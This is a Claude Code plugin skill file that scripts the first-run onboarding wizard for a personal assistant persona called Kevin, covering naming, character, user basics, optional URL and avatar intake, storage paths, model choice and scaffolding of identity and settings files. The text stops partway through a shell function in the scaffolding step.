---
name: init
description: Guided first-run onboarding for the agent-kevin plugin. Walks through Kevin's character (SOUL), role (IDENTITY), your basics (name, timezone), an optional web pull from your blog/site/LinkedIn/etc., and communication style — then scaffolds CLAUDE.md (operating manual + @-imports), SOUL.md, IDENTITY.md, USER.md, .claude/settings.json, and seeds four system-architecture concept articles into knowledge/concepts/. If a CLAUDE.md already exists at the home directory, Kevin's version is written to CLAUDE.local.md instead. Skill packs are configured inline at the end or via /agent-kevin:configure-skills any time later. Invoke once after installing the plugin.
disable-model-invocation: true
allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(uname *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *)
---

# Initialize the agent

Guided onboarding. Follow the steps in order — each step's answers become defaults for later ones.

**On the name "Kevin" below.** This plugin ships a default persona called Kevin, and
Step 1b lets the operator call their agent something else. Two different things wear
that name in this file, and they are not treated the same:

- **The agent's display name.** Every prompt, banner, and status line you show the
  operator, and every word you write into `SOUL.md` / `IDENTITY.md` / `USER.md` /
  `CLAUDE.md`, uses `<AGENT_NAME>` from Step 1b. Where the prose below says "Kevin" in
  a sentence addressed to the operator, substitute it. Before Step 1b the name isn't
  known yet, so say "your agent" rather than guessing.
- **The plugin.** `agent-kevin`, `/agent-kevin:*`, `KEVIN_*`, `.kevin/`,
  `kevin-avatar.jpg`, `bin/kevin`. These are the product and its namespace, not the
  persona. They stay exactly as written no matter what the operator picks.

---

## Step 0 — Resolve HOME and check idempotency

Kevin's home is **the current working directory** — whatever directory the user launched `claude` from (override via `KEVIN_HOME` in the shell rc). The convention for a fresh home is **`~/Documents/Agents/<AgentName>`**: the brain lives in Documents as a browsable vault, and code repos live flat in a separate tree (e.g. `~/Developer/<Org>/<repo>`) — never inside the home. Init scaffolds into cwd only, so when cwd isn't where the home should live, the fix is to relaunch from the right directory, not to scaffold remotely.

```bash
HOME_DIR="${KEVIN_HOME:-${AGENT_HOME:-$PWD}}"
if [ -f "$HOME_DIR/SOUL.md" ]; then
  echo "ALREADY_INITIALIZED at $HOME_DIR"
elif git -C "$HOME_DIR" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  echo "CWD_IS_A_REPO at $HOME_DIR"
fi
[ -d "$HOME/Library/Mobile Documents/com~apple~CloudDocs/Documents" ] && echo "ICLOUD_DOCUMENTS_SYNC=on"
```

`SOUL.md` is the idempotency marker here, and **deliberately not the `.kevin/` data dir**
that the resolver and every runtime guard key on. Those answer "is this *this* agent's
home"; init asks the broader question "would scaffolding here destroy something", and the
answer is yes for any agent's home, not just this one. Every agent's home carries a
`SOUL.md` and only this one's carries this one's data dir, so the wider marker is what
stops a re-run from overwriting a *sibling* agent's identity files. Don't "fix" this to
match the others. (`CLAUDE.md` would be wrong in the other direction — it may pre-exist in
any project the plugin is installed into, and init writes `CLAUDE.local.md` when it does.)

Act on the probes before anything else:

- **`CWD_IS_A_REPO`** — cwd is inside a git work tree that isn't a Kevin home: almost certainly a code repo, and scaffolding a brain into a repo pollutes it (SOUL.md, knowledge/, `.kevin/` all land in the working tree). `AskUserQuestion`:

  > **This looks like a code repo, not a home for Kevin's brain.** You launched `claude` in `<HOME_DIR>`, which is a git repository without a Kevin scaffold. Where should the home live?
  > - **`~/Documents/Agents/<AgentName>` (recommended)** — exit, `mkdir -p` it, relaunch `claude` there, re-run `/agent-kevin:init`
  > - **Here anyway** — I understand the scaffold lands inside this repo

  On the recommended pick, print the exact `mkdir -p ~/Documents/Agents/<AgentName> && cd ~/Documents/Agents/<AgentName> && claude` line and **STOP** — the rest of the wizard runs in the relaunched session. Only "Here anyway" continues.

- **`ICLOUD_DOCUMENTS_SYNC=on`** (macOS, and only relevant when the home is under `~/Documents`) — surface a one-line FYI and continue, never warn or block: *"Heads-up: your Documents folder syncs to iCloud, so the agent's knowledge and secrets will sync with it."*

**Detect the operating system.** Several later steps scaffold OS-specific content — the timezone probe (Step 4), the external-storage suggestion (Step 5c), the security deny-list (Step 7), and the `{{PLATFORM}}` line recorded in CLAUDE.md. Resolve it once here. Claude Code's Bash tool runs under Git Bash on Windows, so `uname` is available everywhere.

```bash
case "$(uname -s)" in
  Darwin)               KEVIN_OS="macos";   PLATFORM_LABEL="macOS" ;;
  MINGW*|MSYS*|CYGWIN*) KEVIN_OS="windows"; PLATFORM_LABEL="Windows" ;;
  Linux)
    if grep -qiE "microsoft|wsl" /proc/version 2>/dev/null; then
      KEVIN_OS="wsl";   PLATFORM_LABEL="Windows (WSL2)"
    else
      KEVIN_OS="linux"; PLATFORM_LABEL="Linux"
    fi ;;
  *)                    KEVIN_OS="unknown"; PLATFORM_LABEL="$(uname -s)" ;;
esac
echo "KEVIN_OS=$KEVIN_OS"
```

Carry `$KEVIN_OS` and `$PLATFORM_LABEL` through the rest of the walk.

**Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all three hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. On macOS both `git` and `python3` come with the Xcode Command Line Tools (`xcode-select --install`); neither needs Homebrew. `gh` is **conditional**: nothing else uses it, but every GitHub-pack tool shells out to it — including `github_fast_forward`, which is what keeps the code checkouts current during `/agent-kevin:sync`. It is not bundled with Claude Code or this plugin, so on macOS it means Homebrew (`brew install gh`). Probing it here turns a mid-session throw into a note the operator can act on before they tick the pack. `poppler` is **optional** as well: the Read tool renders PDF pages through its `pdftoppm` binary, so install it (macOS `brew install poppler`, Linux `poppler-utils`) if you want Kevin to read PDF files. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.

```bash
# Probe FUNCTIONALLY, never with `command -v`. On macOS /usr/bin/git and
# /usr/bin/python3 are xcode-select shims — one shared 118KB binary hard-linked
# under ~78 tool names — that sit on PATH whether or not the Command Line Tools
# are installed. `command -v git` therefore succeeds on a machine that has no
# git, and the failure only appears later when something tries to use it.
# Verified 2026-08-05: with the developer dir unresolvable, `command -v git`
# passes while `git --version` exits 1.
MISSING=()
bun --version >/dev/null 2>&1 || MISSING+=("bun  — runs Kevin's MCP server, hooks, and CLI · https://bun.sh")
git --version >/dev/null 2>&1 || MISSING+=("git  — version-controls your knowledge tree, powers worktrees · https://git-scm.com")
python3 --version >/dev/null 2>&1 || echo "NOTE: python3 not found (optional but recommended — occasionally needed for tooling/interop even though Kevin is TypeScript-first)."
command -v pdftoppm >/dev/null 2>&1 || echo "NOTE: pdftoppm not found (optional — install poppler so the Read tool can render PDFs: macOS 'brew install poppler', Linux 'poppler-utils')."
command -v gh >/dev/null 2>&1 || echo "NOTE: gh not found (needed ONLY if you activate the GitHub pack at Step 8 — that pack's tools, including the sync code-refresh, shell out to it: macOS 'brew install gh', https://cli.github.com)."

# macOS only: name the RIGHT remedy. A failing git on a Mac is almost never a
# missing git download — it's absent Command Line Tools, and the fix is
# `xcode-select --install`, not a trip to git-scm.com.
if [ "$KEVIN_OS" = "macos" ] && ! xcode-select -p >/dev/null 2>&1; then
  echo "XCODE_CLT_MISSING"
fi

# Homebrew is NOT a Kevin dependency — nothing here ever calls it. It's only the
# install path for gh/poppler on macOS, so it's worth a line just when one of
# those is actually missing and the operator would otherwise hit a second wall.
if [ "$KEVIN_OS" = "macos" ] && ! command -v brew >/dev/null 2>&1; then
  echo "NOTE: Homebrew not found — needed only to install gh/poppler if you want them (https://brew.sh)."
fi
printf 'MISSING: %s\n' "${MISSING[@]}"
```

Act on the result **before** anything else:

- **Native Windows (`$KEVIN_OS` = `windows`)** — supported; do **not** stop. Surface a one-line FYI and continue: *"Running on native Windows via Git Bash — the supported Windows path. (Prefer a full Linux userland? WSL2 works too.)"* The OS-specific steps below (timezone probe, external-storage suggestion, security deny-list, the `{{PLATFORM}}` label) already branch on `windows`, so the scaffold is shaped correctly. Heads-up worth surfacing once: a few pack-gated skills assume tools Git Bash lacks (e.g. `jq`), and the OS sandbox is unavailable on Windows — neither blocks the core setup.

- **`XCODE_CLT_MISSING`** — the Xcode Command Line Tools aren't installed, which on a Mac is the usual root cause behind a failing `git` (and `python3`). Surface this **instead of** the generic git line when both fired, since `xcode-select --install` fixes it and a git-scm.com download is the wrong advice:

  > 🛑 **Xcode Command Line Tools aren't installed.** On macOS this is what provides `git` and `python3`. Run this, click through the installer (~10 min), then re-run `/agent-kevin:init`:
  >
  > ```bash
  > xcode-select --install
  > ```

  **STOP** if `git` was also in `MISSING`. If git resolved from elsewhere (Homebrew, a standalone install) this is informational — mention it once and continue.

- **`MISSING` non-empty** — print the block below verbatim (one line per missing tool) and **STOP**:

  > 🛑 **Missing prerequisites.** Kevin can't run until these are installed:
  >
  > `<each MISSING line>`
  >
  > Install them, then re-run `/agent-kevin:init` — it's idempotent and picks up where you left off.

- **Nothing missing** — surface any optional `NOTE`s (if present) as one-line FYIs and continue.

If `ALREADY_INITIALIZED`, `AskUserQuestion` with an explicit enumeration of what re-run does. Surface the full write list so the operator knows what they're agreeing to — Step 0's prior wording understated the destructive surface and operators reasonably trusted it.

> You've already initialized at `<HOME_DIR>`. Re-running will:
>
> ✏️  Overwrite SOUL.md, IDENTITY.md, USER.md, CLAUDE.md / CLAUDE.local.md (operator re-supplies tone/role/name)
> ✓  Preserve `knowledge/memory/index.md` if it has content (compile output safe — Active Threads, Recent Decisions, Learnings)
> ✓  Preserve `knowledge/index.md` if it has content (operator-curated catalog bullets safe)
> ✓  Preserve `knowledge/user/<facet>.md` files that have content (operator-curated facets safe; conflict prompt if Step 5 also synthesises content)
> ✓  Preserve `knowledge/concepts/*.md` (seeded concepts re-materialise only if missing; existing files — including 0-byte tombstones — are never overwritten)
> ✓  Preserve `knowledge/raw/`, `projects/<slug>/` (never touched)
> ⚠️  Reset `projects/TASKS.md` (auto-rebuilds on next task mutation via the `dashboard` tool)
>
> - Abort (recommended)
> - Re-run setup

Default: abort. The preservation guards below in Step 7 are what make these claims true — they must match this prompt verbatim.

---

## Step 1 — Banner + intro

Print the welcome banner inside a fenced code block (the fence preserves the ASCII art literally):

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then below the banner, plain prose (no leading whitespace, no numbered lists — the question-mark glyph signals "step Kevin will ask you about"):

> Welcome. Your agent will set up here: `<HOME_DIR>`.
>
> This onboarding takes about 5 minutes and walks through seven steps:
>
> ❓ What to call your agent (default: Kevin)
> ❓ <AGENT_NAME>'s character, accept or refine
> ❓ <AGENT_NAME>'s role, accept or refine
> ❓ Your basics: name, home timezone
> ❓ Optional: paste any URLs about you (blog, LinkedIn, GitHub, etc.)
> ❓ Optional: paste a path or URL for your avatar (gets linked into knowledge/user/profile.md)
> ❓ Optional: should knowledge/ and projects/ live somewhere outside the home directory?
> ❓ Communication style and values
> ❓ Signal topics to track in your briefings (<AGENT_NAME> proposes a starter set)
> ❓ Optional: configure skill packs (SEO, Browser, Database, GitHub, third-party libraries)
> ❓ Confirm + scaffold
>
> A few of the steps will prompt Claude Code for permission to run Bash commands, write files, or fetch URLs.

---

## Step 1b — Name the agent

The plugin is called `agent-kevin`, but the agent it scaffolds does not have to be
called Kevin. The **display name** (what it calls itself, what the dashboard renders,
how you address it) is pure data in `IDENTITY.md`. The **namespace** (`/agent-kevin:`
commands, `KEVIN_*` env vars, the `.kevin/` data dir, MCP tool names) comes from the
plugin manifest and stays put either way. Renaming costs nothing and breaks nothing.

**On a re-init, the current name is the default, not `Kevin`.** Step 0's re-run path
overwrites `IDENTITY.md`, `SOUL.md`, `USER.md` and `CLAUDE.md`, so offering `Kevin` to
an operator who renamed their agent would quietly rename it back and rewrite every one
of those files around the old name. Read what's there first:

```bash
grep -m1 '^- \*\*Name:\*\*' "$HOME_DIR/IDENTITY.md" 2>/dev/null
```

Whatever that returns is the default below. Only fall back to `Kevin` when the file or
the field is absent (a genuinely fresh home).

Ask it plainly with `AskUserQuestion`:

> **What should this agent be called?**
> - **`<current-or-Kevin>`** (recommended) — keep it as is
> - **Something else** — type a name; the agent introduces itself that way from here on

Then, only when the answer is NOT the default:

> **An emoji for it?** (default `🍌`) — shows up in the banner and the dashboard header.
>
> **An avatar?** Paste a local path or URL, or `skip`. The plugin ships Kevin's avatar;
> a differently-named agent has none, so `skip` is a fine answer and leaves the image
> out of `IDENTITY.md` entirely.

Stage three values for Steps 2, 3 and 7:

- `AGENT_NAME` — the answer, or `Kevin`
- `AGENT_EMOJI` — the answer, or `🍌`
- `AGENT_AVATAR` — the home-relative path the image will land at, which Step 7 then
  copies to. Default name: `.claude/assets/kevin-avatar.jpg`. Renamed with an image:
  `.claude/assets/<name-lowercased>-avatar.<ext>`. Renamed without one: empty.

Decide the path here, not in Step 7 — Step 3 writes it into `IDENTITY.md` before Step 7
runs, so leaving it open until then strands an unresolved token in the file.

**Naming rule, enforced not suggested — an allowlist, and only this one.** The name
must match `^[A-Za-z0-9][A-Za-z0-9 -]*$`: letters, digits, spaces and hyphens, starting
with a letter or digit. Anything else is rejected, and you offer the closest clean form
instead of accepting it.

That's stricter than markdown needs, deliberately. The value is pasted into a `sed`
replacement in Step 7, read back out of `IDENTITY.md` by the dashboard's line parser,
and rendered inside markdown link syntax. `&` and `\` are `sed` replacement
metacharacters, `|` is the delimiter that block uses, and `[`, `]`, backticks and
newlines break the parse on the way back out. One allowlist closes all of them without
anyone having to remember which character breaks which stage.

Everything downstream keys off `AGENT_NAME`: it fills `{{AGENT_NAME}}` in every
template, and `/agent-kevin:upgrade` reads it back out of `IDENTITY.md` on every future
update so template changes arrive phrased in this agent's name instead of proposing
"Kevin" back. An operator can also change their mind later with
`/agent-kevin:rename-agent`.

---

## Step 2 — Kevin's SOUL (character)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/SOUL.md"
```

The template carries `{{AGENT_NAME}}`. Substitute the Step 1b name into the staged
content before writing, and use that name (not "Kevin") in everything you say to the
user from here on.

Summarize in one sentence: *"Default: Sharp, direct, opinionated. Concise. Calls things out when wrong. Doesn't over-apologize."* Then `AskUserQuestion`:

> **<AGENT_NAME>'s character** — accept the default or refine?
> - Accept (recommended)
> - Refine — describe what's different (e.g., "warmer and more encouraging", "even sharper and less polite")

If **Accept**: stage the template verbatim for writing in Step 7.
If **Refine**: take the redirect, edit the staged SOUL content (light touch — tone language in `## Vibe` and `## Core Truths`, keep structure intact).

---

## Step 3 — Kevin's IDENTITY (role)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/IDENTITY.md"
```

Summarize: *"Default: AI assistant for learning, planning, research, coding."* Then `AskUserQuestion`:

> **<AGENT_NAME>'s primary role for you** (pick one)
> - General-purpose personal assistant (recommended)
> - Coding + technical work focus
> - Research + writing focus
> - Life-management + planning focus
> - Custom — describe in one sentence

Adjust the staged IDENTITY's `## Core Role` to match. Leave `## Operational Pattern` empty (Kevin grows it over time).

Resolve the identity tokens from Step 1b: `{{AGENT_NAME}}`, `{{AGENT_EMOJI}}`, and
`{{AGENT_AVATAR}}`. **When no avatar was staged, delete the whole `![...]({{AGENT_AVATAR}})`
line and the `- **Avatar:**` line** rather than leaving an empty link — the dashboard
takes the first image in the file as the avatar, and a dangling one renders broken.

---

## Step 4 — Your basics (name + home timezone)

Infer defaults first:

```bash
NAME_DEFAULT=$(git config user.name 2>/dev/null || echo "${USER:-friend}")
# Timezone probe is OS-specific. macOS/Linux/WSL symlink /etc/localtime into the
# zoneinfo db, so the IANA name falls right out. Windows has no IANA tz database
# (tzutil returns Windows-style names), so skip the probe and let the user type one.
case "$KEVIN_OS" in
  macos|linux|wsl) TZ_IANA=$(readlink /etc/localtime 2>/dev/null | sed 's|.*/zoneinfo/||') ;;
  *)               TZ_IANA="" ;;
esac
```

`AskUserQuestion` (batched):

> 1. **Your name** — what should <AGENT_NAME> call you? (Default: `<NAME_DEFAULT>`)
> 2. **Your home timezone** — IANA name like `America/New_York`, where you're normally based. (System looks like: `<TZ_IANA>`)

When `TZ_IANA` is blank (Windows, or the probe found nothing), drop the "System looks like" hint and prompt for the IANA name outright with an example, e.g. *"IANA name like `Asia/Kuala_Lumpur` — couldn't auto-detect, so please type yours."*

Stage answers for the USER.md write.

---

## Step 4b — Where your code lives (optional)

If you use Kevin for coding or technical work, capturing your **primary codebase** path lets Kevin ground code-related tasks against it (bug fixes, reviews, tracing behavior) and surface its recent git activity in every session's context. Skip freely if Kevin is purely for writing, research, or planning — Kevin works fine with no codebase set.

Best-effort inference — only suggest a default when it's unambiguous (exactly one git repo across the common dev roots), since a generic agent can't know which of many repos is "primary":

```bash
CODE_DEFAULT=""
HITS=()
for root in "$HOME/Developer" "$HOME/Code" "$HOME/code" "$HOME/Projects" "$HOME/projects" "$HOME/src" "$HOME/source" "$HOME/repos" "$HOME/git"; do
  [ -d "$root" ] || continue
  for dir in "$root"/*/; do
    [ -d "${dir}.git" ] && HITS+=("$(cd "$dir" && pwd)")
  done
done
[ "${#HITS[@]}" -eq 1 ] && CODE_DEFAULT="${HITS[0]}"
```

Plain chat (NOT `AskUserQuestion` — the answer is a freeform absolute path):

> **Absolute path to your primary codebase?** Optional — reply `skip` if Kevin isn't for coding, or set it later in `<HOME>/.claude/settings.local.json` under `env.AGENT_CODE_PATH`. Inferred default: `<CODE_DEFAULT>` (blank if nothing obvious found).

Parse the user's next message:

- `skip` (case-insensitive) → stage `AGENT_CODE_PATH=""` and continue.
- Otherwise → verify the path exists (`test -d "$ANSWER"`). If it doesn't, warn and re-ask once.

Stage the resolved absolute path for two writes in Step 7:

1. USER.md → "Where Things Live → Primary codebase" entry.
2. `.claude/settings.local.json` → `env.AGENT_CODE_PATH`, with `env.AGENT_GIT_REPOS` derived to the same path so the codebase's recent git activity shows up in session context from day one.

---

## Step 5 — Optional: paste any URLs about yourself

Freeform multi-URL input. **Do NOT use `AskUserQuestion` here** — its `Other` text field has a fixed placeholder ("Type something") and adding a redundant "Provide URLs" option just to point at it produces a confusing UI. Ask in plain chat instead.

Emit this as a regular assistant message and wait for the user's next turn:

> **Optional — paste any URLs about you** (newline- or space-separated). Examples: personal site/blog, LinkedIn, GitHub, X/Mastodon, podcast page, talks. Kevin fetches each, synthesises durable facts into `knowledge/user/*.md`, and cites the source URL inline. (LinkedIn and X block bots — for those Kevin asks for a quick export instead of fetching.)
>
> Reply with the URLs, or say `skip` to continue with empty stubs.

Parse the user's next message: split on whitespace + newlines, keep tokens that look like URLs (start with `http://`, `https://`, or a bare domain like `github.com/...`). If the message is `skip` (case-insensitive) or contains no URLs, jump to Step 6.

If blank → skip to Step 6.

Otherwise, parse URLs (split on whitespace + newlines, filter to anything that looks like a URL), then partition them:

**Authwalled domains — never fetch.** `linkedin.com`, `x.com`/`twitter.com`, `facebook.com`, `instagram.com` serve a login wall or bot-block to anonymous requests, so a fetch is a guaranteed error — don't attempt it. If any pasted URL matches, ask for an export instead (plain chat, one message covering all matches):

> **LinkedIn/X block automated reads** — but your own export is richer data anyway.
> - LinkedIn: open your profile → **More → Save to PDF**, then paste the file path here.
> - Other authwalled sites: paste the relevant text directly.
>
> Reply with the path/text, or `skip` to drop those URLs.

`Read` the provided file (PDFs work) or take the pasted text, and synthesise it through the same facet routing below, citing the original profile URL as the source. On `skip`, note it in the log and continue.

For every remaining URL, `WebFetch` and synthesise into staged content:

- Bio / about / personal site → `profile.md` (bio, location, work focus) + `interests.md` (topics they write about) + light tone hints → `preferences.md`
- Professional / LinkedIn-style → `career.md` (roles, companies, dates) + `skills.md`
- Code host (GitHub, GitLab, etc.) → augment `skills.md` (languages, repos) + `interests.md` (project themes)
- Social / posts → light tone signal only into `preferences.md`. No post-content extraction.

Sort URLs by their inferred type — Kevin decides which facet each lands in based on content, not the order the user pasted them.

**Rules:**
- Frontmatter: `title`, `sources` (URL list), `created`, `updated` (today)
- Cite inline: `_Source: <URL>_` at end of each fact
- Durable facts only — no transient news items, current events, etc.
- 404 / paywall / fetch error: note it in the log, skip that URL, continue with the rest

**Do not** ask the user to confirm the synthesised content. Stage it and continue — the user can edit any `knowledge/user/*.md` file later, or re-run `/agent-kevin:knowledge-compile` to regenerate.

---

## Step 5b — Optional: your avatar

Plain chat (NOT `AskUserQuestion`, since the answer is freeform):

> **Optional — paste a path or URL for your avatar.** If you give a local path, Kevin copies it to `<HOME>/knowledge/user/assets/avatar.<ext>`. If you give a URL, Kevin downloads it the same place. Either way, Kevin adds an `Avatar:` field to your staged `knowledge/user/profile.md` pointing at the local copy so it shows up in Obsidian. Reply with the path/URL or `skip`.

Parse the next user message:
- `skip` (case-insensitive) → no-op, jump to Step 5c.
- Looks like a local file path → `cp` to `<HOME>/knowledge/user/assets/avatar.<ext>` (`mkdir -p` first; preserve original extension).
- Looks like an HTTP(S) URL → `curl -fsSL` to the same destination, infer extension from response Content-Type or URL suffix.

Stage `Avatar: knowledge/user/assets/avatar.<ext>` into the eventual `knowledge/user/profile.md` frontmatter or top-of-body. Don't fail the whole init if the download/copy fails — log it and continue with no avatar.

---

## Step 5c — Optional: external storage for knowledge/ and projects/

`AskUserQuestion`:

> **Where should `knowledge/`, `projects/`, and `reports/` live?** Default keeps them inside your agent home. Override if you want to:
> - sync via a cloud-synced folder (`<CLOUD_EXAMPLE>` — a path outside the home)
> - keep them in a separate git repo
> - share `projects/` across multiple Kevin homes

Fill `<CLOUD_EXAMPLE>` from `$KEVIN_OS`: iCloud Drive on `macos`, OneDrive (`~/OneDrive`) on `windows`, OneDrive (via `/mnt/c/Users/<you>/OneDrive`) on `wsl`, Dropbox or Nextcloud on `linux`. Don't suggest iCloud on a Windows/WSL/Linux home.
>
> - Default: inside `<HOME>` (recommended)
> - Specify custom paths

If the user picks "Specify", ask for three paths (plain chat or follow-up `AskUserQuestion` rounds): `AGENT_KNOWLEDGE`, `AGENT_PROJECTS`, and `AGENT_REPORTS`. Tilde-expand. Validate the paths look reasonable. Stage all three env-var values for the eventual `.zshrc` reminder in Step 9.

`AGENT_REPORTS` is where the reporting skills (briefings, radar, roadmap, plans) write their outputs. Default `$HOME_DIR/reports`. Linked from `knowledge/index.md` via `reports/index.md` as a 3rd-degree context network.

**If either path is OUTSIDE the agent home directory**, Step 7's `.claude/settings.json` write must also append `permissions.allow` entries (and `sandbox.filesystem.allowWrite` if the user's sandbox is enabled, see below) so Claude Code can read/write there without prompting on every operation. Specifically add to `permissions.allow`:

```json
"Read(<AGENT_KNOWLEDGE>/**)",
"Write(<AGENT_KNOWLEDGE>/**)",
"Edit(<AGENT_KNOWLEDGE>/**)",
"Read(<AGENT_PROJECTS>/**)",
"Write(<AGENT_PROJECTS>/**)",
"Edit(<AGENT_PROJECTS>/**)",
"Read(<AGENT_REPORTS>/**)",
"Write(<AGENT_REPORTS>/**)",
"Edit(<AGENT_REPORTS>/**)"
```

And if `~/.claude/settings.json` has a `sandbox.filesystem.allowWrite` array, mirror those two paths into it too — otherwise Claude Code's sandbox blocks the writes regardless of `permissions.allow`.

If both paths are inside `<HOME>`, no extra grants needed (the home dir's `.` is already on the writable list).

---

## Step 6 — Communication style + values

If Step 5 surfaced a tone signal, use it as a default. Otherwise no default.

`AskUserQuestion`:

> **How do you want Kevin to talk to you?**
> - Direct + technical
> - Step-by-step walkthrough
> - Encouraging + simple
> - Custom — describe in one sentence

Stage for the `## How to Talk to Me` section of USER.md.

Optionally `AskUserQuestion`:

> **Any hard preferences / values I should always respect?** (Optional — answer N/A to skip)
> Examples: "no recommending alcohol", "always halal options", "I work in healthcare — never specific medical actions"

Stage for the `## Hard Rules` section.

---

## Step 6b — Signal topics

These drive the news in your briefings: the `morning-briefing` skill reads `knowledge/user/profile.md` → `## Signal Topics` and runs a web search per topic, so the brief surfaces articles about your interests, projects, industry, and the things you care about, not generic headlines. The whole point is to **recommend** a starter set, not interrogate the user, so do the work first.

**Propose a derived starter list before asking.** Synthesise 5–8 topics from everything you already learned this session:
- The **role** picked in Step 3 (e.g. coding focus → the languages/frameworks/tooling ecosystem; research focus → their fields).
- Facts synthesised from the **URLs** in Step 5 — their industry, stack, employer/domain, side projects, the things they write about.
- Their **locale** (from the Step 4 timezone) — a local tech/business/regulatory cluster where it's relevant.
- Sensible generics for an AI-assistant user: the **AI / model ecosystem** they build on, and a broad tech cluster.

Plain chat (NOT `AskUserQuestion` — this is an open-ended list, and the recommend-then-refine flow matches Steps 5/5b/5c). Emit the proposal as a bullet list and wait for the user's next turn:

> **Signal topics for your briefings.** These are the subjects Kevin tracks with web search each morning so your briefing carries news that's actually relevant to you. Based on what you've told me, here's a starter set:
>
> - `<topic 1>`
> - `<topic 2>`
> - … (5–8, each a short phrase, optionally with a parenthetical of sub-terms)
>
> Reply with edits — drop any, add your own (industries, competitors, technologies, regions, causes) — or say `looks good` to take them as-is. Say `skip` for a minimal default.

Parse the next message: if `looks good` → keep the proposal; if edits/additions → apply them; if `skip` → stage a minimal generic default (`AI engineering & the model ecosystem`, `general technology news`). Stage the final list for the `## Signal Topics` section of `knowledge/user/profile.md` in Step 7.

---

## Step 6c — Model

Kevin's project settings pin which Claude model powers this home. `AskUserQuestion`:

> **Which model should Kevin run on?**
> - **Fable (Recommended)** — Anthropic's most capable tier; best judgment for an agent trusted with your knowledge base.
> - **Opus** — one tier down; stretches a usage-limited plan further.

Stage the answer as `KEVIN_MODEL` — the literal string `fable` or `opus` — for the settings scaffold in Step 7. If the operator picks "Other" and types a model string, stage that verbatim.

---

## Step 7 — Write the scaffold

Create the directory tree:

```bash
# Resolve knowledge + projects + reports paths from Step 5c. Default = under $HOME_DIR.
KNOWLEDGE_ROOT="${KEVIN_KNOWLEDGE:-${AGENT_KNOWLEDGE:-$HOME_DIR/knowledge}}"
PROJECTS_ROOT="${KEVIN_PROJECTS:-${AGENT_PROJECTS:-$HOME_DIR/projects}}"
REPORTS_ROOT="${KEVIN_REPORTS:-${AGENT_REPORTS:-$HOME_DIR/reports}}"

mkdir -p "$HOME_DIR"/.kevin/{config,logs} "$HOME_DIR"/.claude/assets
mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,inbox,archive/inbox}}
mkdir -p "$PROJECTS_ROOT" "$REPORTS_ROOT"
```

**Record the template baseline.** Write `$HOME_DIR/.kevin/version.json` stamping the plugin version this home was scaffolded from. This is the anchor the SessionStart banner + dashboard use to detect pending HOME migrations, and the "from" point `/agent-kevin:upgrade` reconciles from. A fresh home equals the installed version, so it starts `current` (never falsely flagged). **Skip the write if the file already exists** (a re-init must not reset an upgrade-tracked baseline).

```bash
VERSION_FILE="$HOME_DIR/.kevin/version.json"
if [ ! -f "$VERSION_FILE" ]; then
  PLUGIN_VERSION=$(grep -o '"version"[[:space:]]*:[[:space:]]*"[^"]*"' "${CLAUDE_PLUGIN_ROOT}/.claude-plugin/plugin.json" | head -1 | sed 's/.*"\([^"]*\)"$/\1/')
  TODAY=$(date +%Y-%m-%d)
  printf '{\n  "templateVersion": "%s",\n  "initializedAt": "%s",\n  "history": []\n}\n' "$PLUGIN_VERSION" "$TODAY" > "$VERSION_FILE"
fi
```

Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agent-kevin:configure-skills` after the user relaunches.

Copy the agent's avatar into `.claude/assets/` so it stays out of the way at the home root but is still resolvable from `IDENTITY.md`.

**Default name** — ship the bundled Kevin avatar:

```bash
cp "${CLAUDE_PLUGIN_ROOT}/assets/kevin-avatar.jpg" "$HOME_DIR/.claude/assets/kevin-avatar.jpg"
```

`AGENT_AVATAR=.claude/assets/kevin-avatar.jpg`.

**Renamed agent with an avatar staged in Step 1b** — copy the operator's file to a
name-matching destination (lowercase the name, keep the source extension), e.g.
`.claude/assets/vikrum-avatar.png`, and set `AGENT_AVATAR` to that home-relative path.
Don't ship Kevin's face under someone else's name.

**Renamed agent, no avatar** — copy nothing and leave `AGENT_AVATAR` empty; Step 3
already dropped the two image lines from `IDENTITY.md`.

If a user avatar was staged in Step 5b (`<user-avatar>` path resolved to a local file), also:

```bash
cp "<user-avatar>" "$KNOWLEDGE_ROOT/user/assets/avatar.<ext>"
```

(extension preserved from the source). The staged `knowledge/user/profile.md` should then reference that path in its frontmatter or top-of-body.

Write the three identity files (Kevin-unique filenames — won't collide with anything pre-existing):

- `$HOME_DIR/SOUL.md` ← staged content from Step 2
- `$HOME_DIR/IDENTITY.md` ← staged content from Step 3
- `$HOME_DIR/USER.md` ← rendered from Steps 4 + 4b + 6 (template below)

Write the operating manual + Claude Code memory file. **Collision-aware**: if `$HOME_DIR/CLAUDE.md` already exists (plugin installed into an existing project), don't overwrite — write to `$HOME_DIR/CLAUDE.local.md` instead and inform the user.

```bash
if [ -f "$HOME_DIR/CLAUDE.md" ]; then
  CLAUDE_DEST="$HOME_DIR/CLAUDE.local.md"
  COLLISION="yes"
else
  CLAUDE_DEST="$HOME_DIR/CLAUDE.md"
  COLLISION="no"
fi
cp "${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md" "$CLAUDE_DEST"

# Substitute placeholders: the @-import paths reflect the chosen
# KNOWLEDGE_ROOT / PROJECTS_ROOT (may differ from the defaults if the user
# picked "Specify" in Step 6; relative when under HOME_DIR, absolute otherwise),
# and {{PLATFORM}} records the OS detected in Step 0.
relpath() {
  case "$1" in
    "$HOME_DIR") echo "." ;;
